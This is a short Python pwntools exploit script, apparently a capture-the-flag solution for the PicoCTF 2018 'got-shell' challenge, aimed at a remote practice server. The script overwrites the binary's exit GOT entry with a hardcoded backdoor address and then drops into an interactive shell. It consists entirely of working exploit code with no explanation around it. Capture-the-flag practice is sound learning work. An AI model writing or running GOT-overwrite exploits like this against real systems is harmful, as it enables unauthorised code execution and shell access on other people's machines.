from pwn import *


# p = process("./PicoCTF_2018_got-shell")
p = remote("node4.buuoj.cn", 29867)
pro = ELF("./PicoCTF_2018_got-shell")


exit_g = pro.got["exit"]
back_door = 0x0804854B

p.sendlineafter("write this 4 byte value?", hex(exit_g))
p.sendlineafter("would you like to write to", hex(back_door))

p.interactive()


